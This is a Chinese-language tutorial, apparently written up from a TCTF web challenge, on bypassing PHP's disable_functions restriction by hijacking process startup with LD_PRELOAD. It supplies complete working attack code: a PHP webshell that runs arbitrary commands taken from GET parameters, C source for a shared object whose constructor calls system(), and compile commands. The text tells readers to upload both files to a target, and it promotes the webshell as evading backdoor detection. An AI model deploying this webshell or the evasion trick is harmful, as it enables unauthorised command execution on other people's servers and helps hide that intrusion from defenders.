# Bypass_disablefunction_by_LD_PRELOAD



之前在我的大话命令执行绕过中我们使用了imap_open或者email函数来突破

disable_function的限制，本篇介绍另外一种思路

从TCTF-web题目总结出

先贴出原文地址

[Bypass_disablefunction_by_LD_PRELOAD](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bruce_lee.jpg)



首先明白几个基础的概念



### 一、LD_PRELOAD是什么

> LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime   linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。



[LD_PRELOAD的作用](https://blog.csdn.net/chen_jianjian/article/details/80627693)



其实在上面的连接中已经介绍的蛮清楚的



为了达到效果我们的流程应该是这样的：

启动新进程  new.bin

new.bin内部调用函数 func()

func()位于系统共享对象 c.so中

在c.so前优先加载 可控的c_evail.so

c_evail.so中包含函数 func()

由于c_evail.so的优先级高，new.bin将调用 c_evail.so中的 func()



从而达到劫持的效果



举个栗子🌰



bypass_disablefunc.php 

```php
<?php
    echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>";
    $cmd = $_GET["cmd"];
    $out_path = $_GET["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
    putenv("EVIL_CMDLINE=" . $evil_cmdline);

	#putenv是用来改变或增加环境变量的内容。 

    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);
    mail("", "", "", "");
    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
    unlink($out_path);
?>
```





GCC 有个 C 语言扩展修饰符 `__attribute__((constructor))`，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 `__attribute__((constructor))` 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，**不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为**。 



此外，我通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 `unsetenv("LD_PRELOAD")`，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了  unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比  unsetenv() 更直接的删除环境变量的方式。是它，全局变量 `extern char** environ`！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。 



构造`**bypass_disablefunc.c** ` 

```c
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>


extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    // get command line options and arg
    const char* cmdline = getenv("EVIL_CMDLINE");

    // unset environment variable LD_PRELOAD.
    // unsetenv("LD_PRELOAD") no effect on some 
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = '\0';
            }
    }

    // executive command
    system(cmdline);
}
```







一是 cmd 参数，待执行的系统命令（如 pwd）；二是 outpath 参数，保存命令执行输出结果的文件路径（如  /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；三是  sopath 参数，指定劫持系统函数的共享对象的绝对路径（如  /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web  是否可跨目录访问到它。此外，bypass_disablefunc.php 拼接命令和输出路径成为完整的命令行，所以你不用在 cmd  参数中重定向。 



bypass_disablefunc_x64.so 为执行命令的共享对象，用命令 `gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so` 将 bypass_disablefunc.c 编译而来。 若目标为 x86 架构，需要加上 -m32 选项重新编译，bypass_disablefunc_x86.so。 



想办法将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标，指定好三个 GET 参数后，bypass_disablefunc.php 即可突破 disable_functions。执行 `cat /proc/meminfo`



顺便说下，针对 wehshell 的查杀，一般是围绕代码执行函数（如 eval()）、命令执行函数（如 system()）、断言函数（如  assert()）开展的，而 bypass_disablefunc.php 这个 webshell 的本意是突破  disable_functions 执行命令，代码中无任何 webshell 特征函数，所以，副作用是，**它能免杀**。换言之，即便目标并未用 disable_functions 限制命令执行函数，你仍可将 bypass_disablefunc.php 视为普通小马来用，它能躲避后门查杀工具。 







